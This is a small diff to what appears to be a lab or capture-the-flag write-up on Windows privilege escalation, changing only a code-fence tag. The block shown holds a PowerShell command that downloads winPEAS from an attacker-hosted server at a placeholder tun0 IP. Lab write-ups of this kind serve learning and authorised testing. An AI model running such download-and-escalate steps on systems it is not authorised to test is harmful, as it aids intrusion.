@@ -291,7 +291,7 @@ This is a good cmdlet to know, but not really useful due to winPEAS. winPEAS wil
 
 It is time to use winPEAS for some awesome script priviledge escalation. Run a powershell script to get winPEAS from the HTTPServer you are hosting using your tun0 IP.
 
-```ps
+```
 powershell -c Get-Service #manually find service
 powershell -c wget "http://Tun0-IP/winPEAS.exe"
 ```
